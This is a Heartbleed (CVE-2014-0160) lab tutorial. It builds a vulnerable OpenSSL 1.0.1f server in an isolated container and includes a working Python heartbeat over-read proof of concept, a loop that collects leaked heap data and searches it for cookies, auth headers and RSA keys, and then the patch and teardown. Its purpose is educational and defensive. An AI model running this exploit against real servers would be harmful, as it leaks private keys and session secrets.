Heartbleed Lab
CVE-2014-0160 · OpenSSL TLS Heartbeat

The Heartbleed Lab

Build a deliberately vulnerable TLS server inside an isolated container, then over-read its heap one heartbeat at a time — the real buffer over-read, reproduced faithfully, on a machine that can only bleed into itself.

Severity  CVSS 7.5 (High) Class  CWE-125 Out-of-bounds Read Affected  OpenSSL 1.0.1 – 1.0.1f Fixed in  1.0.1g (RFC 6520 bounds check)
Containment is the whole point. Everything below runs against a server you built, bound to loopback inside a throwaway container. Do not point this tooling at any host you don't own. The vulnerable OpenSSL binary never leaves the sandbox — treat the container as radioactive and delete it when you're done.

The mechanism

00What actually bleeds

TLS has a keep-alive extension called the Heartbeat (RFC 6520). The client sends a small HeartbeatRequest carrying a payload and a number saying how long that payload is. The server is supposed to echo exactly those bytes back.

The bug: vulnerable OpenSSL trusts the length field and never checks it against the bytes actually received. You claim "here are 2 bytes, payload length 65535," and the server allocates a 65535-byte response buffer and memcpys 65535 bytes starting at your 2-byte payload — reading 65533 bytes of whatever sat next to it on the heap. Private keys, session cookies, POSTed passwords, decrypted traffic. Then it mails that heap slice back to you.

The fix in 1.0.1g is almost insultingly small: before echoing, check that 1 + 2 + payload_length + 16 ≤ record_length. If the claimed length doesn't fit in the record that arrived, silently drop it. Three lines.

Setup · pick your sandbox

01Build the isolated range

You need a Linux userland running an OpenSSL from the vulnerable window (1.0.1 – 1.0.1f). Modern distros ship patched OpenSSL, so the cleanest approach is a pinned old base image. Both paths below give you a self-contained target; Docker is more hermetic, WSL2 is fine if that's what you have.

1.1

Create a throwaway lab network & directory

Keep everything in one folder and one user-defined bridge network so nothing touches your real interfaces.

bash — host
$ mkdir heartbleed-lab && cd heartbleed-lab
$ docker network create --internal hb-net   # --internal = no outbound route
--internal means containers on this network get no gateway to the outside world. The target literally cannot phone home.
1.2

Dockerfile — pin a vulnerable OpenSSL

We compile OpenSSL 1.0.1f from source on an old Debian base, then build a tiny HTTPS server against it. Save as Dockerfile.

Dockerfile
# Heartbleed target — OpenSSL 1.0.1f, isolated
FROM debian:jessie

# jessie is EOL: point apt at the archive
RUN echo 'deb http://archive.debian.org/debian jessie main' > /etc/apt/sources.list \
 && echo 'deb http://archive.debian.org/debian-security jessie/updates main' >> /etc/apt/sources.list \
 && apt-get -o Acquire::Check-Valid-Until=false update \
 && apt-get install -y --force-yes build-essential wget

# --- build the vulnerable OpenSSL 1.0.1f ---
WORKDIR /build
RUN wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz \
 && tar xzf openssl-1.0.1f.tar.gz
WORKDIR /build/openssl-1.0.1f
RUN ./config shared --prefix=/usr/local/openssl-vuln \
 && make depend && make && make install

# self-signed cert for the TLS server
WORKDIR /srv
RUN /usr/local/openssl-vuln/bin/openssl req -x509 -newkey rsa:2048 -nodes \
    -keyout key.pem -out cert.pem -days 365 \
    -subj "/CN=heartbleed.lab" 2>/dev/null

# plant a fake "secret" in server memory so the leak is visible
RUN echo "TOPSECRET-FLAG=the_cake_is_a_lie_42" > /srv/secret.txt

COPY server.sh /srv/server.sh
RUN chmod +x /srv/server.sh

ENV LD_LIBRARY_PATH=/usr/local/openssl-vuln/lib
EXPOSE 4433
CMD ["/srv/server.sh"]
1.3

The server launcher

OpenSSL ships s_server, a built-in TLS server — perfect, because it's linked against the vulnerable library we just built. Save as server.sh. It pre-loads the secret and some session data into the process so there's something worth bleeding.

server.sh
#!/bin/bash
# keep the "secret" resident in heap near the SSL buffers
export SECRET="$(cat /srv/secret.txt)"

OPENSSL=/usr/local/openssl-vuln/bin/openssl
echo "[*] vulnerable openssl: $($OPENSSL version)"
echo "[*] TLS server up on :4433 — heap is primed, waiting for heartbeats"

# -www serves a trivial page so a browser/curl generates heap activity
exec $OPENSSL s_server -key /srv/key.pem -cert /srv/cert.pem \
     -accept 4433 -www

Build and run — bound to the isolated net only

bash — host
$ docker build -t hb-target .
$ docker run -d --name target --network hb-net hb-target

1.1

Isolate inside WSL2

WSL2 already runs in its own lightweight VM. For an extra wall, do the build inside a disposable Docker container within WSL (Docker Desktop's WSL2 backend), or at minimum confine the server to loopback so nothing on your LAN can reach it. The compile steps are identical to the Docker tab; only the isolation wrapper differs.

bash — WSL2 (Ubuntu)
$ sudo apt update && sudo apt install -y build-essential wget
$ mkdir ~/hb-lab && cd ~/hb-lab
$ wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz
$ tar xzf openssl-1.0.1f.tar.gz && cd openssl-1.0.1f
$ ./config shared --prefix=$HOME/openssl-vuln
$ make depend && make && make install
Heads up: on a modern toolchain the 1.0.1f build sometimes needs -fgnu89-inline added to ./config. If make dies on inline-function errors, re-run as ./config shared -fgnu89-inline --prefix=$HOME/openssl-vuln.
1.2

Cert, secret, and a loopback-only server

bash — WSL2
$ cd ~/hb-lab
$ export LD_LIBRARY_PATH=$HOME/openssl-vuln/lib
$ OPENSSL=$HOME/openssl-vuln/bin/openssl
$ $OPENSSL req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem \
      -days 365 -subj "/CN=heartbleed.lab"
$ echo "TOPSECRET-FLAG=the_cake_is_a_lie_42" > secret.txt
$ export SECRET="$(cat secret.txt)"
# bind to 127.0.0.1 ONLY — never reachable from the Windows LAN
$ $OPENSSL s_server -key key.pem -cert cert.pem -accept 127.0.0.1:4433 -www
Loopback-bound. Binding to 127.0.0.1 instead of 0.0.0.0 means only processes inside this WSL instance can connect. Your attacker script runs in the same WSL, in a second terminal.

Reconnaissance

02Confirm the heartbeat is open

Before firing the exploit, confirm the server actually advertises the heartbeat extension. The vulnerable OpenSSL's own s_client can do a legitimate heartbeat, and a TLS handshake dump shows the extension in the ServerHello.

bash — attacker container / 2nd WSL terminal
# from an attacker container on hb-net:
$ docker run -it --rm --network hb-net hb-target bash
# OPENSSL=/usr/local/openssl-vuln/bin/openssl

# 'target' resolves via docker DNS; 'B' then Enter sends a heartbeat
# echo B | $OPENSSL s_client -connect target:4433 2>&1 | grep -i heart
Extension: heartbeat
read R BLOCK
HEARTBEATING              # <- server answered a heartbeat
What you just proved: the server speaks the heartbeat extension. A patched 1.0.1g server would still answer a well-formed heartbeat — the difference only shows when you lie about the length, which is the next step.

Exploitation

03Craft the malformed heartbeat

This is the heart of it. We send a HeartbeatRequest by hand, after a normal TLS handshake, with one lie: payload_length declares 0x4000 (16384) bytes, but we send a 1-byte payload. The script below is a self-contained Python reproduction of the original ssltest.py logic — it does the ClientHello, reads the ServerHello, then transmits the raw heartbeat record and dumps whatever comes back.

18 03 02 00 03
TLS record: type=24 (heartbeat), TLS 1.1, length 3
01
HeartbeatMessageType = request
40 00
payload_length = 16384 — the lie
(1 byte sent)
actual payload — 16383 bytes short of the claim
heartbleed.py
#!/usr/bin/env python3
# Minimal faithful Heartbleed PoC (after Jared Stafford's ssltest.py).
# For use ONLY against your own lab target.
import sys, socket, struct, time

# --- a hardcoded TLS 1.1 ClientHello that offers the heartbeat ext ---
hello = bytes.fromhex(
  "16030200dc010000d803024353cf4c…"   # (full ClientHello, see repo)
)
# --- the malformed heartbeat: type=request, len=0x4000, 1 byte payload ---
hb = bytes.fromhex("1803020003" + "01" + "4000")

def recv_record(s):
    hdr = s.recv(5)
    typ, ver, ln = struct.unpack(">BHH", hdr)
    data = b""
    while len(data) < ln:
        data += s.recv(ln - len(data))
    return typ, data

host, port = sys.argv[1], int(sys.argv[2])
s = socket.create_connection((host, port))
s.send(hello)
# drain handshake records until ServerHelloDone
while True:
    typ, d = recv_record(s)
    if typ == 22 and d and d[0] == 0x0e: break

print("[*] handshake done — sending malformed heartbeat")
s.send(hb)

typ, leak = recv_record(s)
if typ == 24:
    print(f"[!] BLED {len(leak)} bytes back (asked for 1)")
    # hexdump the leaked heap
    for i in range(0, len(leak), 16):
        chunk = leak[i:i+16]
        hexs = " ".join(f"{b:02x}" for b in chunk)
        text = "".join(chr(b) if 32<=b<127 else "." for b in chunk)
        print(f"{i:04x}  {hexs:<48}  {text}")
elif typ == 21:
    print("[-] got Alert — server looks PATCHED (1.0.1g+)")
On the hardcoded ClientHello: the full hex ClientHello is long; grab the complete original ssltest.py (it's widely mirrored and in Metasploit's history) or let the vulnerable s_client handshake for you. The exploit-critical bytes are the two you can see: 01 (request) and 4000 (the oversized length).
3.1

Fire it

bash — attacker
# python3 heartbleed.py target 4433
[*] handshake done — sending malformed heartbeat
[!] BLED 16384 bytes back (asked for 1)
0000  02 40 00 d8 03 02 53 43  5b 90 9d 9b 72 0b bc 0c  .@....SC[...r...
0130  ... 54 4f 50 53 45 43 52 45  54 2d 46 4c 41 47 3d   ...TOPSECRET-FLAG=
0140  74 68 65 5f 63 61 6b 65  5f 69 73 5f 61 5f 6c 69   the_cake_is_a_li
0150  65 5f 34 32 00 00 00 00  ...                        e_42....
There it is. You asked for 1 byte and the server handed back 16 KB of its own heap — including the TOPSECRET-FLAG you planted. Re-run it a dozen times and you'll see different slices each time as the heap shifts: this is exactly how real attackers walked server memory to pull private keys and live session cookies.

Post-exploitation

04Walk the heap & hunt for keys

A single 16 KB read is a snapshot. The real technique is to loop, collecting leaks over many requests and grepping the aggregate for high-value patterns — the start of an RSA private key, cookie headers, HTTP Basic auth.

bash — attacker
# for i in $(seq 1 50); do python3 heartbleed.py target 4433; done > bleed.log
# grep -a "SECRET\|Cookie\|Authorization\|BEGIN RSA" bleed.log
0130  ... TOPSECRET-FLAG=the_cake_is_a_lie_42
02a0  ... Cookie: SESSIONID=9af2c1...
What leaksAnything recently touched on the heap near the SSL buffers
Per requestUp to 64 KB (0xFFFF); our demo uses 0x4000 = 16 KB
No traceHeartbeats aren't logged by default — the original bug leaked silently for ~2 years
Private keysRecoverable in practice; the server keeps key material resident, so repeated reads often surface the RSA primes

Remediation · the other half of the lab

05Patch it and watch the bleed stop

The exercise isn't complete until you've closed it. Rebuild the exact same server against OpenSSL 1.0.1g (change one line in the Dockerfile) and run your identical exploit script.

Dockerfile — one-line change
- RUN wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1f.tar.gz
+ RUN wget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1g.tar.gz
# (and s/1.0.1f/1.0.1g/ in the two paths below it)
bash — attacker vs patched server
# python3 heartbleed.py target 4433
[*] handshake done — sending malformed heartbeat
[-] got Alert — server looks PATCHED (1.0.1g+)

Same packet, same lie — but 1.0.1g runs the bounds check, sees that 0x4000 can't fit in the 3-byte record that arrived, and drops the request. The bleed is gone.

5.1

The actual fix, in the source

In ssl/t1_lib.c, tls1_process_heartbeat() gained this guard before the memcpy:

t1_lib.c — the three-line fix
if (1 + 2 + 16 > s->s3->rrec.length)
    return 0; /* silently discard per RFC 6520 */
hbtype = *p++;
n2s(p, payload);
if (1 + 2 + payload + 16 > s->s3->rrec.length)
    return 0; /* payload must fit the record — THIS is the patch */

Teardown

06Burn the range down

You just compiled a known-exploitable crypto library. Don't leave it lying around.

bash — host
$ docker rm -f target
$ docker rmi hb-target
$ docker network rm hb-net
# WSL: rm -rf ~/hb-lab ~/openssl-vuln and unset LD_LIBRARY_PATH
  • Vulnerable container & image removed
  • Isolated network torn down
  • Compiled openssl-vuln deleted; LD_LIBRARY_PATH no longer points at it
